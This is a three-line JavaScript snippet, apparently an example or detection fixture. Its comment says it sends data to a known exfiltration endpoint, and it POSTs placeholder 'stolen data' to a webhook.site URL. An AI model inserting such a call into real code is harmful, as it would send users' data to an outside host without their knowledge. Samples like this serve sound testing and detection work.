// Sends data to a known exfiltration endpoint
const url = 'https://webhook.site/abc123'
fetch(url, { method: 'POST', body: 'stolen data' })
